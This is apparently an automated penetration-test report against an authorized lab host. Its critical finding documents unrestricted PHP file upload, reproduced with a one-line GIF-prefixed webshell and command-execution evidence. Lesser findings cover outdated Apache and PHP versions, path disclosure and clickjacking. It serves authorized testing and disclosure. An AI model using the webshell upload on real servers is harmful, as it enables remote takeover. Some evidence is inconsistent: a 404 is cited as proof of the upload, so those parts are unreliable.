# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Unrestricted PHP File Upload leading to Remote Code Execution](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.38 (Debian) — multiple known CVEs (CVE-2019-0211 privesc, CVE-2021-40438 mod_proxy SSRF)](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life PHP 7.1.33 — unsupported branch, no security patches since Dec 2019](#finding-3)
    - [4. LOW — info-disclosure PHP Error Message Reveals Server Filesystem Path](#finding-4)
    - [5. LOW — info-disclosure Apache server version disclosed in error page bodies](#finding-5)
    - [6. INFO — burp Frameable response (potential Clickjacking)](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqy3bzn7-ukmd7w` |
| Target | http://target.local:32825/ |
| Started | 2026-06-28T17:56:39.349Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32825`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 1 critical, 1 high, 1 medium, 2 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Unrestricted PHP File Upload leading to Remote Code Execution

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32825/

The image upload endpoint at POST /index.php accepts PHP files without any extension or content-type restriction. By uploading a PHP webshell disguised with a GIF magic-byte prefix (GIF89a), the server stores the file in the web-accessible /upload/ directory and executes it as PHP. Confirmed OS command execution as www-data: `id` returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, `hostname` returned `a1021f31eb5e`. Full server path disclosed by PHP error: /var/www/html/upload/. The upload requires no authentication.

**Reproduction**

```
1. POST /index.php with multipart/form-data; upload field name=userfile, filename=shell.php, Content-Type=image/gif, body=GIF89a<?php system($_GET['c']);?>\n2. Server responds 200 and stores file at /upload/shell.php (confirmed via page showing img src)\n3. GET /upload/shell.php?c=id → returns GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Evidence**

- Evidence `ev-mqy3gxwe-6` — `artifacts/s-0001/ev-mqy3gxwe-6/`

Request:

```http
GET /upload/shell.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:00:30 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

- Evidence `ev-mqy3qnsj-x` — `artifacts/s-0001/ev-mqy3qnsj-x/`

Request:

```http
GET /upload/verdictwebshell.php?c=id HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 60
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:03 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Evidence `ev-mqy3qo99-y` — `artifacts/s-0001/ev-mqy3qo99-y/`

Request:

```http
GET /upload/verdictwebshell.php?c=hostname HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 19
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:04 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

GIF89aa1021f31eb5e
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — multiple known CVEs (CVE-2019-0211 privesc, CVE-2021-40438 mod_proxy SSRF)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32825/

VERSION-BASED finding (matched by banner, not exploited). The server advertises `Server: Apache/2.4.38 (Debian)` (fingerprinted from the Server response header; additionally corroborated by the Apache 2.4.38 signature in the 404 error-page footer — see negative-control evidence). Apache httpd 2.4.38 was released Jan 2019 and is far behind the current 2.4.x branch; it is affected by numerous published CVEs, notably:
- CVE-2019-0211 (CVSS 7.8, HIGH): local privilege escalation via the scoreboard; affects 2.4.17–2.4.38, fixed in 2.4.39 — directly applicable to this exact version.
- CVE-2021-40438 (CVSS 9.0, CRITICAL): mod_proxy SSRF/request forwarding; affects httpd ≤ 2.4.48 — applicable if mod_proxy is enabled (not verified here).
- CVE-2019-0217 (mod_auth_digest access-control bypass) and CVE-2019-0220 (inconsistent URL normalization), both fixed in 2.4.39.
- Later request-smuggling/mod_lua issues (e.g. CVE-2022-22720, CVE-2021-44790) also post-date 2.4.38.
Severity set to HIGH on the version-confirmed local-privesc CVE-2019-0211; the critical mod_proxy SSRF (CVE-2021-40438) raises this further where mod_proxy is in use. The operator should verify the exact patch level (Debian backports security fixes without changing the advertised version string) and which modules are enabled before relying on exploitability.

**Reproduction**

```
1. GET http://target.local:32825/ → 200, response carries `Server: Apache/2.4.38 (Debian)` (positive replays ev-mqy47n2z-1z and ev-mqy47o6l-20, identical 503-byte bodies). 2. The version is independently visible in the default 404 error page footer: GET http://target.local:32825/verdict-no-such-path-404-control → 404 body contains `Apache/2.4.38 (Debian) Server at ... Port 32825` (ev-mqy47p4k-21). 3. Compare 2.4.38 against the published CVE list / current 2.4.x to confirm missing patches.
```

**Evidence**

- Evidence `ev-mqy47p4k-21` — `artifacts/_/ev-mqy47p4k-21/`

Request:

```http
GET /verdict-no-such-path-404-control HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:21:18 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

- Evidence `ev-mqy47n2z-1z` — `artifacts/_/ev-mqy47n2z-1z/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 503
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:21:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdictstoXmqy40xg6ad8tsafe.jpg"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```

- Evidence `ev-mqy47o6l-20` — `artifacts/_/ev-mqy47o6l-20/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 503
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:21:17 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdictstoXmqy40xg6ad8tsafe.jpg"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life PHP 7.1.33 — unsupported branch, no security patches since Dec 2019

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32825/

VERSION-BASED finding (matched by banner, not exploited). The app discloses `X-Powered-By: PHP/7.1.33` (fingerprinted from the X-Powered-By response header on / and /index.php). PHP 7.1.33 (Oct 2019) was the FINAL release of the 7.1 series; the 7.1 branch reached end-of-life on 2019-12-01 and has received no security support since. An EOL runtime accumulates unpatched vulnerabilities — any PHP security issue disclosed after Dec 2019 and fixed only in the then-supported 7.2/7.3/7.4/8.x branches remains open in 7.1.33. Representative example never patched in 7.1: CVE-2020-7066 (get_headers() truncation on a NUL byte → SSRF/information disclosure; fixed in 7.2.28/7.3.15/7.4.3, 7.1 already EOL). The headline risk is the unsupported, unmaintained status itself rather than a single confirmed unauthenticated RCE in this build, hence MEDIUM. Remediation: upgrade to a supported PHP release (8.2+). Note: Debian/distro packagers may backport fixes without changing the version string — verify the actual build date before relying on a specific CVE.

**Reproduction**

```
1. GET http://target.local:32825/ → 200 with `X-Powered-By: PHP/7.1.33` (positive replay ev-mqy47n2z-1z). 2. GET http://target.local:32825/index.php → 200, same `X-Powered-By: PHP/7.1.33` banner, stable (positive replay ev-mqy47o6l-20). 3. Negative control: GET http://target.local:32825/verdict-no-such-path-404-control → distinguishable 404 (279 bytes vs 503) (ev-mqy47p4k-21). 4. Cross-reference 7.1 EOL date (2019-12-01) and post-EOL PHP CVEs to confirm the branch is unsupported.
```

**Evidence**

- Evidence `ev-mqy47p4k-21` — `artifacts/_/ev-mqy47p4k-21/`

Request:

```http
GET /verdict-no-such-path-404-control HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:21:18 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

- Evidence `ev-mqy47n2z-1z` — `artifacts/_/ev-mqy47n2z-1z/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 503
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:21:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdictstoXmqy40xg6ad8tsafe.jpg"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```

- Evidence `ev-mqy47o6l-20` — `artifacts/_/ev-mqy47o6l-20/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 503
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:21:17 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdictstoXmqy40xg6ad8tsafe.jpg"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```

<a id="finding-4"></a>

### 4. [LOW] [info-disclosure] PHP Error Message Reveals Server Filesystem Path

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32825/

When the uploaded PHP webshell is accessed without the required `c` query parameter, PHP emits an unhandled error that discloses the full filesystem path: /var/www/html/upload/verdictwebshell.php. PHP error display is not suppressed in production (display_errors=On or equivalent). This is secondary to the RCE finding (f-001) but shows error verbosity is unmitigated.

**Reproduction**

```
1. Upload PHP file per f-001 steps to obtain /upload/shell.php\n2. GET /upload/shell.php (no c param)\n3. Response body: GIF89a Warning: system(): Cannot execute a blank command in /var/www/html/upload/shell.php on line 1
```

**Evidence**

- Evidence `ev-mqy3gxwe-6` — `artifacts/s-0001/ev-mqy3gxwe-6/`

Request:

```http
GET /upload/shell.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:00:30 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

- Evidence `ev-mqy3py89-v` — `artifacts/s-0001/ev-mqy3py89-v/`

Request:

```http
GET /upload/verdictwebshell.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 144
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:07:30 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

GIF89a<br />
<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/www/html/upload/verdictwebshell.php</b> on line <b>1</b><br />
```

- Evidence `ev-mqy3s8o7-14` — `artifacts/s-0001/ev-mqy3s8o7-14/`

Request:

```http
GET /upload/verdictwebshell.php HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 144
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:09:17 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

GIF89a<br />
<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/www/html/upload/verdictwebshell.php</b> on line <b>1</b><br />
```

<a id="finding-5"></a>

### 5. [LOW] [info-disclosure] Apache server version disclosed in error page bodies

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32825/

The default Apache `ServerSignature On` setting causes all error pages (403, 404, 500…) to include the exact server version and OS in the HTML `<address>` footer: `Apache/2.4.38 (Debian) Server at target.local Port 32825`. The 200 root page body contains no such string. An attacker can trivially fingerprint the server to target known CVEs for Apache 2.4.38.

**Reproduction**

```
1. Send GET /upload/ — receive a 403 HTML page.
2. Observe the &lt;address&gt; footer: "Apache/2.4.38 (Debian) Server at … Port 32825".
3. Compare with GET / (200): body contains no server version string.
Fix: set `ServerTokens Prod` and `ServerSignature Off` in Apache configuration.
```

**Evidence**

- Evidence `ev-mqy3vgd9-17` — `artifacts/s-0002/ev-mqy3vgd9-17/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 492
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:11:47 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdicttraversal.gif"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```

- Evidence `ev-mqy3u419-16` — `artifacts/s-0002/ev-mqy3u419-16/`

Request:

```http
GET /upload/ HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 282
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:10:44 GMT
keep-alive: timeout=5, max=68
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

- Evidence `ev-mqy3wj52-19` — `artifacts/s-0002/ev-mqy3wj52-19/`

Request:

```http
GET /upload/ HTTP/1.1
Host: target.local:32825
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 282
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:12:37 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32825</address>
</body></html>
```

<a id="finding-6"></a>

### 6. [INFO] [burp] Frameable response (potential Clickjacking)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: FIRM) @ http://target.local:32825/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqy49lky-22` — `artifacts/_/ev-mqy49lky-22/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32825

GET / HTTP/1.1
Host: target.local:32825
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Sun, 28 Jun 2026 18:22:17 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.1.33
Vary: Accept-Encoding
Content-Length: 503
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html>
  <head>
    <title>Image Upload</title>
  </head>
  <body style="background-color:#B3C8CF">
    <div align="center"><img src="upload/verdictstoXmqy40xg6ad8tsafe.jpg"></div>    <div align="center" style="background-color:#FFFFFF">
      <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="userfile" id="userfile"><br/>
        <input type="submit" value="Upload Image" name="submit">
      </form>
        </div>
  </body>
</html>
```
